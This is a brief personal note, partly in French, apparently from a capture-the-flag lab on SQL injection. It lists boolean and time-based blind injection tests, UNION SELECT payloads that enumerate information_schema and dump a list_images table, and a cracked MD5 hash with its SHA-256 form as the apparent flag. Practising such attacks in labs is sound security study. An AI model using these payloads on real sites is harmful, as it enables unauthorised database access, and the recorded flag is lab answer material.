savoir si injection sql fonctionne en blind:
'1 OR 1=1' dans ce cas
mais si pas de sortie possibilite de faire un Sleep
'1 AND SLEEP(5.5)'

We should have the same amount of table in each select, so use null to simaulate columns number
    -> '1 UNION SELECT TABLE_NAME, null FROM information_schema.TABLES'
    -> '1 UNION SELECT TABLE_NAME, column_name FROM information_schema.COLUMNS'

    information sur flag dans list_images url quand on fait 1 OR 1=1: 
    -> '1 UNION SELECT url, comment FROM list_images'

decrypt md5:
    1928e8083cf461a51303633093573c46 = albatroz

encrypt sha256:
    albatroz = f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188
